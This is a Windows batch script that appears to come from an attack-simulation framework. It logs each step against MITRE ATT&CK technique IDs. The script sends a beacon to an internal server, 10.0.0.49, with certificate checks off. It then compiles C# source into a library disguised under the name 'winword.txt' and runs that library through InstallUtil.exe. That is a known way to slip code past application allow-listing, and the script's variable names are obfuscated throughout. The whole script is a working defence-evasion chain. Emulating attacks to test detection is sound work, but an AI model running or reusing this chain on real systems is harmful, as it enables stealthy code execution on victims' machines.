@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9963\5e7dc221
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9963-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=winword.txt
SET njozco=file.txt
SET kkjwr=9963
SET qwerz=%APPDATA%\!ufeybybm!\macula-simulations.log
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!qwerz!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_complete=>> "!qwerz!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!qwerz!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: chdir_complete=>> "!qwerz!" 2>nul
SET vvbxn=1
SET ytpmh=
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!qwerz!" 2>nul
csc.exe /target:library /reference:System.Configuration.Install.dll /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
IF NOT EXIST "!hpnjatpj!" SET vvbxn=0&SET ytpmh=compile_failed
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: compile_complete=!vvbxn!>> "!qwerz!" 2>nul
echo [%DATE% %TIME%][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!vvbxn!:!ytpmh!>> "!qwerz!" 2>nul
SET mmnkl=1
SET pqlok=
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: execution_start=installutil>> "!qwerz!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!hpnjatpj!" >nul 2>&1
IF ERRORLEVEL 1 SET mmnkl=0&SET pqlok=execution_failed
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: execution_complete=!mmnkl!>> "!qwerz!" 2>nul
echo [%DATE% %TIME%][TTP][!lqyereup!][!kkjwr!]: T1218.004|InstallUtil=!mmnkl!:!pqlok!>> "!qwerz!" 2>nul